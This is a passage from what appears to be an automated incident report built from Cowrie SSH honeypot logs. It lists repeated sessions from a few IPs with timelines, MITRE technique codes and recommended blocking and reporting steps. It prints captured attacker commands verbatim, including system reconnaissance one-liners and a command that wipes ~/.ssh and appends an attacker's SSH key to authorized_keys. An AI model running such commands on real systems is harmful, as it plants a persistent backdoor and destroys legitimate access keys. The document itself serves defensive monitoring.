- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-039c28fc9f74

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-30 01:31 |
| **Last Seen** | 2026-07-30 01:31 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 01:31:55` | `cowrie.session.connect` |
| `2026-07-30 01:31:56` | `cowrie.client.version` |
| `2026-07-30 01:31:56` | `cowrie.client.kex` |
| `2026-07-30 01:31:57` | `cowrie.login.success` |
| `2026-07-30 01:31:58` | `cowrie.session.params` |
| `2026-07-30 01:31:58` | `cowrie.command.input` |
| `2026-07-30 01:31:58` | `cowrie.command.input` |
| `2026-07-30 01:31:58` | `cowrie.command.input` |
| `2026-07-30 01:31:58` | `cowrie.command.input` |
| `2026-07-30 01:31:58` | `cowrie.command.input` |
| `2026-07-30 01:31:58` | `cowrie.command.success` |
| `2026-07-30 01:31:58` | `cowrie.command.input` |
| `2026-07-30 01:31:58` | `cowrie.command.input` |
| `2026-07-30 01:31:58` | `cowrie.command.input` |
| `2026-07-30 01:31:58` | `cowrie.command.input` |
| `2026-07-30 01:31:59` | `cowrie.log.closed` |
| `2026-07-30 01:31:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21ffcca827f6

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-30 01:33 |
| **Last Seen** | 2026-07-30 01:33 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 01:33:27` | `cowrie.session.connect` |
| `2026-07-30 01:33:27` | `cowrie.client.version` |
| `2026-07-30 01:33:27` | `cowrie.client.kex` |
| `2026-07-30 01:33:28` | `cowrie.login.success` |
| `2026-07-30 01:33:30` | `cowrie.session.params` |
| `2026-07-30 01:33:30` | `cowrie.command.input` |
| `2026-07-30 01:33:30` | `cowrie.command.input` |
| `2026-07-30 01:33:30` | `cowrie.command.input` |
| `2026-07-30 01:33:30` | `cowrie.command.input` |
| `2026-07-30 01:33:30` | `cowrie.command.input` |
| `2026-07-30 01:33:30` | `cowrie.command.success` |
| `2026-07-30 01:33:30` | `cowrie.command.input` |
| `2026-07-30 01:33:30` | `cowrie.command.input` |
| `2026-07-30 01:33:30` | `cowrie.command.input` |
| `2026-07-30 01:33:30` | `cowrie.command.input` |
| `2026-07-30 01:33:30` | `cowrie.log.closed` |
| `2026-07-30 01:33:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee496bccf5d4

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-30 01:34 |
| **Last Seen** | 2026-07-30 01:34 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 01:34:54` | `cowrie.session.connect` |
| `2026-07-30 01:34:55` | `cowrie.client.version` |
| `2026-07-30 01:34:55` | `cowrie.client.kex` |
| `2026-07-30 01:34:56` | `cowrie.login.success` |
| `2026-07-30 01:34:57` | `cowrie.session.params` |
| `2026-07-30 01:34:57` | `cowrie.command.input` |
| `2026-07-30 01:34:57` | `cowrie.command.input` |
| `2026-07-30 01:34:57` | `cowrie.command.input` |
| `2026-07-30 01:34:57` | `cowrie.command.input` |
| `2026-07-30 01:34:57` | `cowrie.command.input` |
| `2026-07-30 01:34:57` | `cowrie.command.success` |
| `2026-07-30 01:34:57` | `cowrie.command.input` |
| `2026-07-30 01:34:57` | `cowrie.command.input` |
| `2026-07-30 01:34:57` | `cowrie.command.input` |
| `2026-07-30 01:34:57` | `cowrie.command.input` |
| `2026-07-30 01:34:57` | `cowrie.log.closed` |
| `2026-07-30 01:34:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-255f72e30a80

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-30 01:36 |
| **Last Seen** | 2026-07-30 01:36 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 01:36:20` | `cowrie.session.connect` |
| `2026-07-30 01:36:20` | `cowrie.client.version` |
| `2026-07-30 01:36:20` | `cowrie.client.kex` |
| `2026-07-30 01:36:21` | `cowrie.login.success` |
| `2026-07-30 01:36:23` | `cowrie.session.params` |
| `2026-07-30 01:36:23` | `cowrie.command.input` |
| `2026-07-30 01:36:23` | `cowrie.command.input` |
| `2026-07-30 01:36:23` | `cowrie.command.input` |
| `2026-07-30 01:36:23` | `cowrie.command.input` |
| `2026-07-30 01:36:23` | `cowrie.command.input` |
| `2026-07-30 01:36:23` | `cowrie.command.success` |
| `2026-07-30 01:36:23` | `cowrie.command.input` |
| `2026-07-30 01:36:23` | `cowrie.command.input` |
| `2026-07-30 01:36:23` | `cowrie.command.input` |
| `2026-07-30 01:36:23` | `cowrie.command.input` |
| `2026-07-30 01:36:23` | `cowrie.log.closed` |
| `2026-07-30 01:36:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-543593f78502

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-30 01:37 |
| **Last Seen** | 2026-07-30 01:37 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 01:37:46` | `cowrie.session.connect` |
| `2026-07-30 01:37:46` | `cowrie.client.version` |
| `2026-07-30 01:37:46` | `cowrie.client.kex` |
| `2026-07-30 01:37:48` | `cowrie.login.success` |
| `2026-07-30 01:37:49` | `cowrie.session.params` |
| `2026-07-30 01:37:49` | `cowrie.command.input` |
| `2026-07-30 01:37:49` | `cowrie.command.input` |
| `2026-07-30 01:37:49` | `cowrie.command.input` |
| `2026-07-30 01:37:49` | `cowrie.command.input` |
| `2026-07-30 01:37:49` | `cowrie.command.input` |
| `2026-07-30 01:37:49` | `cowrie.command.success` |
| `2026-07-30 01:37:49` | `cowrie.command.input` |
| `2026-07-30 01:37:49` | `cowrie.command.input` |
| `2026-07-30 01:37:49` | `cowrie.command.input` |
| `2026-07-30 01:37:49` | `cowrie.command.input` |
| `2026-07-30 01:37:50` | `cowrie.log.closed` |
| `2026-07-30 01:37:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b9c636322df0

| Field | Detail |
|---|---|
| **Source IP** | `123.52.202[.]92` |
| **First Seen** | 2026-07-30 01:38 |
| **Last Seen** | 2026-07-30 01:38 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 01:38:11` | `cowrie.session.connect` |
| `2026-07-30 01:38:12` | `cowrie.client.version` |
| `2026-07-30 01:38:12` | `cowrie.client.kex` |
| `2026-07-30 01:38:14` | `cowrie.login.success` |
| `2026-07-30 01:38:14` | `cowrie.direct-tcpip.request` |
| `2026-07-30 01:38:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `123.52.202[.]92` to AbuseIPDB if not already reported
- [ ] Block `123.52.202[.]92` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e511bc591e9e

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-30 01:39 |
| **Last Seen** | 2026-07-30 01:39 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 01:39:12` | `cowrie.session.connect` |
| `2026-07-30 01:39:12` | `cowrie.client.version` |
| `2026-07-30 01:39:12` | `cowrie.client.kex` |
| `2026-07-30 01:39:15` | `cowrie.login.success` |
| `2026-07-30 01:39:16` | `cowrie.session.params` |
| `2026-07-30 01:39:16` | `cowrie.command.input` |
| `2026-07-30 01:39:16` | `cowrie.command.input` |
| `2026-07-30 01:39:16` | `cowrie.command.input` |
| `2026-07-30 01:39:16` | `cowrie.command.input` |
| `2026-07-30 01:39:16` | `cowrie.command.input` |
| `2026-07-30 01:39:16` | `cowrie.command.success` |
| `2026-07-30 01:39:16` | `cowrie.command.input` |
| `2026-07-30 01:39:16` | `cowrie.command.input` |
| `2026-07-30 01:39:16` | `cowrie.command.input` |
| `2026-07-30 01:39:16` | `cowrie.command.input` |
| `2026-07-30 01:39:17` | `cowrie.log.closed` |
| `2026-07-30 01:39:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-98adf55fec38

| Field | Detail |
|---|---|
| **Source IP** | `182.71.135[.]110` |
| **First Seen** | 2026-07-30 01:39 |
| **Last Seen** | 2026-07-30 01:39 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 01:39:12` | `cowrie.session.connect` |
| `2026-07-30 01:39:12` | `cowrie.client.version` |
| `2026-07-30 01:39:13` | `cowrie.client.kex` |
| `2026-07-30 01:39:14` | `cowrie.login.success` |
| `2026-07-30 01:39:15` | `cowrie.session.params` |
| `2026-07-30 01:39:15` | `cowrie.command.input` |
| `2026-07-30 01:39:15` | `cowrie.command.failed` |
| `2026-07-30 01:39:16` | `cowrie.log.closed` |
| `2026-07-30 01:39:17` | `cowrie.session.params` |
| `2026-07-30 01:39:17` | `cowrie.command.input` |
| `2026-07-30 01:39:17` | `cowrie.session.file_download` |
| `2026-07-30 01:39:17` | `cowrie.log.closed` |
| `2026-07-30 01:39:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.71.135[.]110` to AbuseIPDB if not already reported
- [ ] Block `182.71.135[.]110` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ceb43b6fe05

| Field | Detail |
|---|---|
| **Source IP** | `182.71.135[.]110` |
| **First Seen** | 2026-07-30 01:39 |
| **Last Seen** | 2026-07-30 01:39 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 01:39:18` | `cowrie.session.connect` |
| `2026-07-30 01:39:18` | `cowrie.client.version` |
| `2026-07-30 01:39:18` | `cowrie.client.kex` |
| `2026-07-30 01:39:19` | `cowrie.login.success` |
| `2026-07-30 01:39:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.71.135[.]110` to AbuseIPDB if not already reported
- [ ] Block `182.71.135[.]110` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f8e7a80270a

| Field | Detail |
|---|---|
| **Source IP** | `182.71.135[.]110` |
| **First Seen** | 2026-07-30 01:39 |
| **Last Seen** | 2026-07-30 01:39 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 01:39:20` | `cowrie.session.connect` |
| `2026-07-30 01:39:20` | `cowrie.client.version` |
| `2026-07-30 01:39:20` | `cowrie.client.kex` |
| `2026-07-30 01:39:22` | `cowrie.login.success` |
| `2026-07-30 01:39:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.71.135[.]110` to AbuseIPDB if not already reported
- [ ] Block `182.71.135[.]110` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f9986b7e83e

| Field | Detail |
|---|---|
| **Source IP** | `35.188.112[.]111` |
| **First Seen** | 2026-07-30 01:39 |
| **Last Seen** | 2026-07-30 01:39 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 01:39:26` | `cowrie.session.connect` |
| `2026-07-30 01:39:26` | `cowrie.client.version` |
| `2026-07-30 01:39:26` | `cowrie.client.kex` |
| `2026-07-30 01:39:26` | `cowrie.login.success` |
| `2026-07-30 01:39:27` | `cowrie.session.params` |
| `2026-07-30 01:39:27` | `cowrie.command.input` |
| `2026-07-30 01:39:27` | `cowrie.command.failed` |
| `2026-07-30 01:39:27` | `cowrie.log.closed` |
| `2026-07-30 01:39:28` | `cowrie.session.params` |
| `2026-07-30 01:39:28` | `cowrie.command.input` |
| `2026-07-30 01:39:28` | `cowrie.session.file_download` |
| `2026-07-30 01:39:28` | `cowrie.log.closed` |
| `2026-07-30 01:39:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.188.112[.]111` to AbuseIPDB if not already reported
- [ ] Block `35.188.112[.]111` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-774148aac554

| Field | Detail |
|---|---|
| **Source IP** | `35.188.112[.]111` |
| **First Seen** | 2026-07-30 01:39 |
| **Last Seen** | 2026-07-30 01:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 01:39:28` | `cowrie.session.connect` |
| `2026-07-30 01:39:28` | `cowrie.client.version` |
| `2026-07-30 01:39:28` | `cowrie.client.kex` |
| `2026-07-30 01:39:28` | `cowrie.login.success` |
| `2026-07-30 01:39:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.188.112[.]111` to AbuseIPDB if not already reported
- [ ] Block `35.188.112[.]111` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e052e57e652

| Field | Detail |
|---|---|
| **Source IP** | `35.188.112[.]111` |
| **First Seen** | 2026-07-30 01:39 |
| **Last Seen** | 2026-07-30 01:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 01:39:28` | `cowrie.session.connect` |
| `2026-07-30 01:39:28` | `cowrie.client.version` |
| `2026-07-30 01:39:28` | `cowrie.client.kex` |
| `2026-07-30 01:39:28` | `cowrie.login.success` |
| `2026-07-30 01:39:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.188.112[.]111` to AbuseIPDB if not already reported
- [ ] Block `35.188.112[.]111` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd7c8a2572c8

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-30 01:40 |
| **Last Seen** | 2026-07-30 01:40 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 01:40:41` | `cowrie.session.connect` |
| `2026-07-30 01:40:41` | `cowrie.client.version` |
| `2026-07-30 01:40:41` | `cowrie.client.kex` |
| `2026-07-30 01:40:42` | `cowrie.login.success` |
| `2026-07-30 01:40:43` | `cowrie.session.params` |
| `2026-07-30 01:40:43` | `cowrie.command.input` |
| `2026-07-30 01:40:43` | `cowrie.command.input` |
| `2026-07-30 01:40:43` | `cowrie.command.input` |
| `2026-07-30 01:40:43` | `cowrie.command.input` |
| `2026-07-30 01:40:43` | `cowrie.command.input` |
| `2026-07-30 01:40:43` | `cowrie.command.success` |
| `2026-07-30 01:40:43` | `cowrie.command.input` |
| `2026-07-30 01:40:43` | `cowrie.command.input` |
| `2026-07-30 01:40:43` | `cowrie.command.input` |
| `2026-07-30 01:40:43` | `cowrie.command.input` |
| `2026-07-30 01:40:44` | `cowrie.log.closed` |
| `2026-07-30 01:40:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-75f46ec26642

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-30 01:42 |
| **Last Seen** | 2026-07-30 01:42 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 01:42:19` | `cowrie.session.connect` |
| `2026-07-30 01:42:19` | `cowrie.client.version` |
| `2026-07-30 01:42:19` | `cowrie.client.kex` |
| `2026-07-30 01:42:20` | `cowrie.login.success` |
| `2026-07-30 01:42:21` | `cowrie.session.params` |
| `2026-07-30 01:42:21` | `cowrie.command.input` |
| `2026-07-30 01:42:21` | `cowrie.command.input` |
| `2026-07-30 01:42:21` | `cowrie.command.input` |
| `2026-07-30 01:42:21` | `cowrie.command.input` |
| `2026-07-30 01:42:21` | `cowrie.command.input` |
| `2026-07-30 01:42:21` | `cowrie.command.success` |
| `2026-07-30 01:42:21` | `cowrie.command.input` |
| `2026-07-30 01:42:21` | `cowrie.command.input` |
| `2026-07-30 01:42:21` | `cowrie.command.input` |
| `2026-07-30 01:42:21` | `cowrie.command.input` |
| `2026-07-30 01:42:21` | `cowrie.log.closed` |
| `2026-07-30 01:42:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-45855b10488a

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-30 01:43 |
